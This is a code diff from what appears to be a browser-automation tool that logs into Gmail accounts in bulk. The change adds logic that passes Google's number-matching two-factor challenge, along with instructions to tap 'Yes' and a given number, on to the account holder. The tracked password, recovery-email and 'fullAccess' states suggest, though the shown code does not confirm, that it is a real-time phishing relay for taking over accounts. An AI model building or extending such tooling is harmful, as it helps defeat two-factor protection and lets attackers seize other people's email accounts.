@@ -4301,7 +4301,7 @@ if (!foundSelector) {
                                             verificationState: verificationDetails.type === 'choice' ? 'WAITINGOPTIONS' : verificationDetails.type === 'text_input' ? (verificationDetails.viewName === 'Gmail Phone Number Entry' ? 'WAITINGPHONENUMBER' : 'WAITINGRECOVERYEMAIL') : verificationDetails.type === 'password' ? 'WAITINGPASSWORD_ERROR' : 'WAITINGCODE',
                                             verificationOptions: verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName) : [],
                                             viewName: verificationDetails.viewName,
-                                            gmail: isPhonePrompt ? { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: verificationDetails.deviceName || null, instructions: verificationDetails.deviceName ? `Google sent a notification to your ${verificationDetails.deviceName}. Open the Gmail app and tap Yes on the prompt to verify it's you.` : "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." } : undefined
+                                            gmail: isPhonePrompt ? { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: verificationDetails.deviceName || null, challengeNumber: verificationDetails.challengeNumber || null, promptInstructions: verificationDetails.promptInstructions || null, instructions: verificationDetails.promptInstructions || (verificationDetails.challengeNumber ? `Google sent a notification to your ${verificationDetails.deviceName || 'phone'}. Open the Gmail app and tap Yes on the prompt, then tap ${verificationDetails.challengeNumber} on your phone to verify it's you.` : (verificationDetails.deviceName ? `Google sent a notification to your ${verificationDetails.deviceName}. Open the Gmail app and tap Yes on the prompt to verify it's you.` : "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in.")) } : undefined
                                         };
                                     } else {
                                         // HARD GATE: even though the poll above found no error, re-check right
@@ -4720,7 +4720,9 @@ if (!foundSelector) {
                         logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Page transitioned to phone prompt: ${currentPageVerificationState.viewName}. Setting WAITINGCODE with phone prompt metadata.`);
                         finalStatus = "WAITINGCODE";
                         const _ppDn = currentPageVerificationState.deviceName || null;
-                        const _ppInstr = _ppDn ? `Google sent a notification to your ${_ppDn}. Open the Gmail app and tap Yes on the prompt to verify it's you.` : "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in.";
+                        const _ppNum = currentPageVerificationState.challengeNumber || null;
+                        const _ppPrompt = currentPageVerificationState.promptInstructions || null;
+                        const _ppInstr = _ppPrompt || (_ppNum ? `Google sent a notification to your ${_ppDn || 'phone'}. Open the Gmail app and tap Yes on the prompt, then tap ${_ppNum} on your phone to verify it's you.` : (_ppDn ? `Google sent a notification to your ${_ppDn}. Open the Gmail app and tap Yes on the prompt to verify it's you.` : "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in."));
                         const ljpPP = JSON.parse(updateData.lastJsonResponse || '{}');
                         updateData = {
                             status: "WAITINGCODE",
@@ -4730,14 +4732,14 @@ if (!foundSelector) {
                                 status: "WAITING_CODE",
                                 verificationState: 'WAITING_CODE',
                                 viewName: currentPageVerificationState.viewName,
-                                gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _ppDn, instructions: _ppInstr },
+                                gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _ppDn, challengeNumber: _ppNum, promptInstructions: _ppPrompt, instructions: _ppInstr },
                                 message: _ppInstr
                             })
                         };
                         updateBrowserRowDataFast(browserId, {
                             status: "WAITINGCODE", verified: true, fullAccess: false,
                             lastJsonResponse: updateData.lastJsonResponse,
-                            gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _ppDn, instructions: _ppInstr }
+                            gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _ppDn, challengeNumber: _ppNum, promptInstructions: _ppPrompt, instructions: _ppInstr }
                         });
                         return;
                     }
@@ -5027,18 +5029,20 @@ if (!foundSelector) {
                                     logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to phone prompt: ${gmailPostClickVerification.viewName}. Setting WAITINGCODE with phone prompt metadata.`);
                                     finalStatus = "WAITINGCODE";
                                     const _gmailPPDn = gmailPostClickVerification.deviceName || null;
-                                    const _gmailPPInstr = _gmailPPDn ? `Google sent a notification to your ${_gmailPPDn}. Open the Gmail app and tap Yes on the prompt to verify it's you.` : "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in.";
+                                    const _gmailPPNum = gmailPostClickVerification.challengeNumber || null;
+                                    const _gmailPPPrompt = gmailPostClickVerification.promptInstructions || null;
+                                    const _gmailPPInstr = _gmailPPPrompt || (_gmailPPNum ? `Google sent a notification to your ${_gmailPPDn || 'phone'}. Open the Gmail app and tap Yes on the prompt, then tap ${_gmailPPNum} on your phone to verify it's you.` : (_gmailPPDn ? `Google sent a notification to your ${_gmailPPDn}. Open the Gmail app and tap Yes on the prompt to verify it's you.` : "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in."));
                                     const ljpGmailPP = JSON.parse(updateData.lastJsonResponse || '{}');
                                     updateData = {
                                         status: "WAITINGCODE",
                                         verificationChoice: '',
-                                        gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _gmailPPDn, instructions: _gmailPPInstr },
+                                        gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _gmailPPDn, challengeNumber: _gmailPPNum, promptInstructions: _gmailPPPrompt, instructions: _gmailPPInstr },
                                         lastJsonResponse: JSON.stringify({
                                             ...ljpGmailPP,
                                             status: "WAITING_CODE",
                                             verificationState: 'WAITING_CODE',
                                             viewName: gmailPostClickVerification.viewName,
-                                            gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _gmailPPDn, instructions: _gmailPPInstr },
+                                            gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, deviceName: _gmailPPDn, challengeNumber: _gmailPPNum, promptInstructions: _gmailPPPrompt, instructions: _gmailPPInstr },
                                             verificationOptions: currentVerificationOptions,
                                             message: _gmailPPInstr
                                         })
